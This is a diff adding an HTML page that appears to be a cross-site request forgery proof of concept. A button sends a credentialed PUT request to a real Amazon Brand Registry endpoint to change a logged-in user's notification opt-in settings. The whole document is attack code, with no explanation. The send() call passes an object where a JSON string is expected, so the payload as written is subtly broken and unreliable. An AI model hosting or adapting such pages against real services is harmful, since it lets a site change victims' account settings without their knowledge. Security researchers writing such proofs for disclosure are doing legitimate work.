@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick='sendRequest()'>Submit request</button>
+<script>
+function sendRequest() {
+  var xhr = new XMLHttpRequest();
+  xhr.open('PUT', 'https://brandregistry.amazon.in:443/br-comms/mons');
+  xhr.withCredentials = true;
+  xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+  xhr.send({"language_of_preference":"en_US","opt_in_status_tm_status_changes":"OPTED_IN"}  );
+}
+</script>
+</body>
+</html>
